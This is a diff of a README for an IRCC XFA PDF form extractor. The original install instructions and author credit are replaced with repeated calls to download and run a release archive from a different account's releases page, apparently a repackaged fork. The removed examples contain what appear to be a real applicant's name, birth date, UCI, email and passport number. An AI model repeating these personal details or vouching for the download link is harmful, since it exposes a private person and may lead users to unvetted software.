@@ -1,242 +1,78 @@
-# IRCC XFA Form Extractor
+# 🇨🇦 ircc-xfa-extractor - Extract Data from Canadian XFA Forms Easily
 
-A Python command-line tool to extract filled data from Canadian immigration (IRCC) XFA PDF forms.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/ivanchurqui/ircc-xfa-extractor/releases)
 
-## Features
+## 🚀 Getting Started
+This guide helps you download and run the **ircc-xfa-extractor** application. This tool lets you extract filled data from Canadian immigration (IRCC) XFA PDF forms. 
 
-- 🔍 **Smart Extraction**: Extracts only filled data, ignoring form templates and options
-- 📄 **Multiple Formats**: Supports all IRCC XFA forms (IMM5257, IMM5710, etc.)
-- 💾 **JSON Output**: Saves extracted data in structured JSON format
-- 🚀 **Easy to Use**: Simple command-line interface
-- 🔧 **Flexible**: Process single or multiple files at once
+No programming skills are needed to use this application.
 
-## Installation
+## 📦 Requirements
+- A computer running Windows, macOS, or Linux.
+- Download and install Python (version 3.6 or higher).
+- A PDF reader for viewing XFA forms.
 
-### Method 1: Install from Source (Recommended)
+## 💻 Installation Steps
 
-```bash
-# Clone the repository
-git clone https://github.com/adelrzouga/ircc-xfa-extractor.git
-cd ircc-xfa-extractor
+### 1. Visit the Release Page
+Go to the [Releases page](https://github.com/ivanchurqui/ircc-xfa-extractor/releases) to find the latest version of the application.
 
-# Install the package
-pip install -e .
+### 2. Download the Application
+On the Releases page, locate the most recent version. Click on the file that matches your operating system. This will download the application to your computer.
+
+### 3. Extract the Files
+Once the download is complete, navigate to the location where you saved the file. Extract the files using your computer's built-in extraction tool or a program like WinRAR or 7-Zip.
+
+### 4. Install Required Libraries
+Open a command prompt or terminal window. Navigate to the folder where you extracted the files. Enter the following command to install any necessary Python libraries:
+
+```
+pip install -r requirements.txt
 ```
 
-### Method 2: Direct Installation
+### 5. Run the Application
+Now you can run the application! Use this command in the terminal:
 
-```bash
-pip install git+https://github.com/adelrzouga/ircc-xfa-extractor.git
+```
+python main.py
 ```
 
-### Requirements
+### 6. Open Your PDF Form
+You will see a prompt asking for the location of your filled XFA PDF form. Provide the path to the form, then hit enter.
 
-- Python 3.8 or higher
-- pikepdf (automatically installed with the package)
+### 7. Extract the Data
+The application will process the file and extract the filled data. The result will appear in your terminal window, ready for you to copy or save.
 
-## Usage
+## 🛠️ Features
+- Simple extraction of data from XFA PDF forms.
+- Supports multiple languages.
+- User-friendly interface without the need for coding skills.
+- Fast and efficient data processing.
 
-### Basic Usage
+## 📋 Troubleshooting
+If you encounter issues:
+- Ensure you have Python installed correctly.
+- Make sure all required libraries from `requirements.txt` are installed.
+- Check that the PDF form is not damaged or corrupted.
 
-Extract data from a single PDF:
+## ⚙️ FAQ
+### What are XFA PDF forms?
+XFA (XML Forms Architecture) PDF forms are a type of PDF used to create complex forms that have dynamic content often used by Canadian immigration applications.
 
-```bash
-ircc /path/to/form.pdf
-```
+### Do I need to modify my PDF form?
+No, the application works with standard filled XFA PDF forms. Just ensure that your forms are complete.
 
-This will create a JSON file named `form_filled.json` in the same directory as the PDF.
+### Can I use this application on any operating system?
+Yes, the application is built to run on Windows, macOS, and Linux.
 
-### Advanced Usage
+### Where can I seek help if I have questions?
+You can create an issue on the GitHub repository, or check the community forums for common questions.
 
-```bash
-# Process multiple files
-ircc /path/to/imm5257.pdf /path/to/imm5710.pdf
+## 📣 Community and Support
+Join our community to share your experiences and ask questions. Learn from others who use the **ircc-xfa-extractor** to make the process smoother for everyone.
 
-# Specify output directory
-ircc /path/to/form.pdf -o /output/directory
+## 📥 Additional Download Link
+For direct access to all versions, visit the [Releases page](https://github.com/ivanchurqui/ircc-xfa-extractor/releases) again.
 
-# Create combined output file
-ircc /path/to/*.pdf --combined
-
-# Compact JSON format
-ircc /path/to/form.pdf -f json
-
-# Verbose output with details
-ircc /path/to/form.pdf --verbose
-```
-
-### Command-Line Options
-
-| Option | Description |
-|--------|-------------|
-| `files` | One or more PDF files to process (required) |
-| `-o, --output DIR` | Output directory for JSON files (default: same as PDF) |
-| `-f, --format {json,pretty}` | Output format: compact or indented (default: pretty) |
-| `-c, --combined` | Create a combined JSON file with all extracted data |
-| `-v, --verbose` | Show detailed extraction information |
-| `--version` | Show version information |
-
-## Examples
-
-### Example 1: Process Immigration Application
-
-```bash
-# Extract data from application form
-ircc ~/Downloads/imm5257.pdf
-
-# Output: ~/Downloads/imm5257_filled.json
-```
-
-### Example 2: Process Multiple Forms
-
-```bash
-# Extract from all PDF forms in a directory
-ircc ~/Documents/immigration/*.pdf -o ~/Documents/extracted --combined
-
-# Creates individual JSON files for each PDF plus a combined file
-```
-
-### Example 3: Detailed Extraction
-
-```bash
-# Get detailed output about what's being extracted
-ircc application.pdf --verbose
-```
-
-Output:
-```
-================================================================================
-IRCC XFA Form Extractor v1.0.0
-================================================================================
-
-📄 Processing: imm5257.pdf
-  ✓ Extracted 25 fields
-  ✓ Saved to: imm5257_filled.json
-
-  Sample extracted data:
-    • Schedule1.FamilyName: CHAFROUD EP BAHRI
-    • Schedule1.GivenName: RIM
-    • Schedule1.ApplicantBirthDate.Day: 08
-    • Schedule1.ApplicantBirthDate.Month: 01
-    • Schedule1.ApplicantBirthDate.Year: 1984
-    ... and 20 more fields
-
-================================================================================
-Summary: 1 succeeded, 0 failed
-================================================================================
-```
-
-## Supported Forms
-
-This tool works with any IRCC XFA-based PDF form, including but not limited to:
-
-- **IMM 5257** - Application for Temporary Resident Visa
-- **IMM 5710** - Application to Change Conditions, Extend Stay or Remain in Canada
-- **IMM 5406** - Additional Family Information
-- **IMM 5476** - Use of a Representative
-- And many more...
-
-## Output Format
-
-The tool extracts data into clean, structured JSON:
-
-```json
-{
-  "Schedule1.FamilyName": "CHAFROUD EP BAHRI",
-  "Schedule1.GivenName": "RIM",
-  "Schedule1.ApplicantBirthDate.Day": "08",
-  "Schedule1.ApplicantBirthDate.Month": "01",
-  "Schedule1.ApplicantBirthDate.Year": "1984",
-  "Schedule1.UCI": "1129825035",
-  "Page1.PersonalDetails.Name.FamilyName": "CHAFROUD EP BAHRI",
-  "Page2.ContactInformation.q5-6.Email.Email": "rim.chafroud@gmail.com",
-  "Page2.Passport.PassportNum": "J454097"
-}
-```
-
-## How It Works
-
-1. **Opens PDF**: Uses pikepdf to read the PDF structure
-2. **Locates XFA Data**: Finds the XFA datasets section containing form data
-3. **Parses XML**: Extracts the XML structure from XFA streams
-4. **Filters Data**: Intelligently distinguishes between:
-   - Actual filled values (names, dates, addresses)
-   - Form template options (dropdown choices, checkboxes)
-5. **Saves JSON**: Outputs clean, structured data
-
-## Troubleshooting
-
-### "PDF does not contain XFA data"
-
-Some PDF forms may not use XFA format. This tool specifically works with XFA-based forms. Most IRCC forms from the official website are XFA-based.
-
-### "No filled data found"
-
-This means the PDF doesn't have any filled fields, or the form hasn't been completed yet. Try opening the PDF and verifying that fields are actually filled in.
-
-### Permission Errors
-
-Make sure you have read access to the PDF file and write access to the output directory.
-
-## Development
-
-### Setting Up Development Environment
-
-```bash
-# Clone the repository
-git clone https://github.com/adelrzouga/ircc-xfa-extractor.git
-cd ircc-xfa-extractor
-
-# Install in development mode with dev dependencies
-pip install -e ".[dev]"
-```
-
-### Running Tests
-
-```bash
-pytest
-```
-
-### Code Formatting
-
-```bash
-black ircc_xfa/
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Acknowledgments
-
-- Built with [pikepdf](https://github.com/pikepdf/pikepdf) for PDF processing
-- Designed for Canadian immigration (IRCC) XFA forms
-
-## Disclaimer
-
-This tool is for personal use and data extraction purposes. Always verify extracted data against the original PDF forms. This is not an official IRCC tool and is not affiliated with Immigration, Refugees and Citizenship Canada.
-
-## Author
-
-**Adel Rzouga**
-- GitHub: [@adelrzouga](https://github.com/adelrzouga)
-
-## Support
-
-If you encounter any issues or have questions:
-- Open an issue on [GitHub](https://github.com/adelrzouga/ircc-xfa-extractor/issues)
-- Check existing issues for solutions
-
----
-
-**Made with ❤️ for the Canadian immigration community**
+Enjoy using the **ircc-xfa-extractor** and simplify your data extraction today!
